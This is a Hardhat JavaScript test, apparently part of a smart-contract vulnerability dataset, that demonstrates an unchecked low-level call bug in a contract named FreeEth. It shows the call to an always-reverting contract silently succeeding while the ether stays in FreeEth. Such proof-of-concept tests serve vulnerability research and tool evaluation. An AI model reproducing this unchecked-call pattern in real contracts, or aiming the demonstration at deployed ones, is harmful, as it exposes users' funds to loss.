const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol", function () {

  let owner;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const FreeEth = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol:FreeEth");
    const contract = await FreeEth.connect(owner).deploy();

    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {contract, revertContract} = await loadFixture(deployContracts);
    const amount = ethers.parseEther("1");
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await expect(contract.connect(owner).Command(revertContract.target, "0x", {value: amount})).to.not.be.reverted;

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);

    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);

  });
});
